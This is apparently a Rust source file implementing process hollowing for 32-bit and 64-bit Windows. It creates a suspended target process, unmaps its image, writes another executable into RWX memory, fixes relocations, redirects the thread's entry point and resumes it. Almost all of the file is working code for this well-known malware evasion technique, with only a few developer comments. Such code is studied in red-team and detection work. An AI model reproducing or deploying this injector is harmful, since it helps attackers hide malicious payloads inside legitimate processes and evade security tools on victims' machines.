#[macro_use]
extern crate bitfield;
extern crate mem_tools;

use mem_tools::*;

use anyhow::*;
use winapi::ctypes::c_void;
use ntapi::ntmmapi:: NtUnmapViewOfSection;
use winapi::um::{
    errhandlingapi::{ GetLastError },
    memoryapi::{ VirtualAllocEx },
    processthreadsapi::{
        CreateProcessA, STARTUPINFOA, PROCESS_INFORMATION, ResumeThread,
        GetThreadContext, SetThreadContext, // SuspendThread
    },
    winbase:: {
        CREATE_SUSPENDED,
        Wow64GetThreadContext, Wow64SetThreadContext
    },
    winnt:: {
        IMAGE_DIRECTORY_ENTRY_BASERELOC, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE,
        CONTEXT, WOW64_CONTEXT, CONTEXT_FULL, WOW64_CONTEXT_FULL
    }
};

use std::ffi::CString;
use std::mem::zeroed;
use std::ptr::null_mut;

const STATUS_SUCCESS: i32 = 0x0;

pub unsafe fn hollow32(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    // Create dest process
    let mut startup = zeroed::<STARTUPINFOA>();
    let mut process_info = zeroed::<PROCESS_INFORMATION>();

    let dest = CString::new(dest.into()).expect("CString::new failed");
    CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

    // Get dest image, image_address
    let hp = process_info.hProcess;
    let mut dest_image_address = get_remote_image_base_address(hp)?;

    // read src program and mapping
    let mut buffer = get_binary_from_file(src.into())?;
    let src_image = read_image32(&mut buffer[0] as *const _ as *mut c_void);
    let src_nt_header = *src_image.FileHeader;

    // Unmapping image from dest process
    if NtUnmapViewOfSection(hp, dest_image_address as *mut _) != STATUS_SUCCESS {
        bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
    };

    // Allocate memory for src program
    dest_image_address = VirtualAllocEx(
        hp, dest_image_address as *mut _, src_nt_header.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if dest_image_address as u64 == 0x0 as u64 {
        bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
    };

    // calculate delta before to change base address
    let delta = calculate_delta(dest_image_address as usize, (*src_image.FileHeader).OptionalHeader.ImageBase as usize);

    // change base address to allocated memory address
    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u32;

    copy_remote_headers(hp, dest_image_address, &mut buffer[0] as *const _ as *mut _)?;
    copy_remote_section_headers(hp, dest_image_address, &src_image, &mut buffer[0] as *const _ as *mut _)?;
    delta.remote_delta_relocation(hp, dest_image_address as _, &mut buffer[0] as *const _ as *mut _)?;

    // create context, and change entry point
    let entry_point = dest_image_address as u64 + (*src_image.FileHeader).OptionalHeader.AddressOfEntryPoint as u64;
    let mut context = zeroed::<WOW64_CONTEXT>();
    context.ContextFlags = WOW64_CONTEXT_FULL;

    if Wow64GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not get thread context: {}", GetLastError());
    }

    context.Eax = entry_point as u32;

    if Wow64SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not set thread context: {}", GetLastError());
    }

    // Resume thread
    if ResumeThread(process_info.hThread) == u32::MAX {
        bail!("could not set thread context: {}", GetLastError());
    }

    // remove debug print
    println!("process was hollowed ε٩(๑> 3 <)۶з");

    Ok(())
}

pub unsafe fn hollow64(src: impl Into<String>, dest: impl Into<String>) -> Result<()> {
    // Create dest process
    let mut startup = zeroed::<STARTUPINFOA>();
    let mut process_info = zeroed::<PROCESS_INFORMATION>();

    let dest = CString::new(dest.into()).expect("CString::new failed");
    CreateProcessA(null_mut(), dest.as_ptr() as *mut _, null_mut(), null_mut(), 0, CREATE_SUSPENDED, null_mut(), null_mut(), &mut startup, &mut process_info);

    // Get dest image, image_address
    let hp = process_info.hProcess;
    let mut dest_image_address = get_remote_image_base_address(hp)?;

    // this did not worked, i guess image =/= not image_base_address so
    // println!("Architecture: {:?}", x96_check(&mut image));

    // read src program and mapping
    let mut buffer = get_binary_from_file(src.into())?;

    // as example, sample.exe is 64bit so expect Architecture output is X96::X64
    // then at here, using read_image64
    // and need to pass buffer[0], not buffer. becase &buffer is Vec struct pointer.
    // arg pointer should be buffer's first pointer so
    // btw, "&mut buffer[0] as *const _ as *mut _" is ugly, i have to change better code...
    let src_image = read_image64(&mut buffer[0] as *const _ as *mut &[u8]);
    let src_nt_header = *src_image.FileHeader;

    // Unmapping image from dest process
    if NtUnmapViewOfSection(hp, dest_image_address as *mut _) != STATUS_SUCCESS {
        bail!("could not unmapping image from dest process. NtUnmapViewOfSection calling was failed.")
    };

    // Allocate memory for src program
    dest_image_address = VirtualAllocEx(
        hp, dest_image_address as *mut _, src_nt_header.OptionalHeader.SizeOfImage as usize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    );
    if dest_image_address as u64 == 0x0 as u64 {
        bail!("could not allocate of the remote process image. VirtualAllocEx calling was failed.")
    };

    // calculate delta before to change base address
    let delta = calculate_delta(dest_image_address as usize, (*src_image.FileHeader).OptionalHeader.ImageBase as usize);

    // change base address to allocated memory address
    (*src_image.FileHeader).OptionalHeader.ImageBase = dest_image_address as u64;

    copy_remote_headers(hp, dest_image_address, &mut buffer[0] as *const _ as *mut _)?;
    copy_remote_section_headers(hp, dest_image_address, &src_image, &mut buffer[0] as *const _ as *mut _)?;
    delta.remote_delta_relocation(hp, dest_image_address as _, &mut buffer[0] as *const _ as *mut _)?;

    // create context, and change entry point
    let entry_point = dest_image_address as u64 + (*src_image.FileHeader).OptionalHeader.AddressOfEntryPoint as u64;
    let mut context = zeroed::<CONTEXT>();
    context.ContextFlags = CONTEXT_FULL;

    if GetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not get thread context: {}", GetLastError());
    }

    context.Rip = entry_point;

    if SetThreadContext(process_info.hThread, &mut context as *mut _) == 0 {
        bail!("could not set thread context: {}", GetLastError());
    }

    // Resume thread
    if ResumeThread(process_info.hThread) == u32::MAX {
        bail!("could not set thread context: {}", GetLastError());
    }

    // remove debug print
    println!("process was hollowed ε٩(๑> 3 <)۶з");

    Ok(())
}
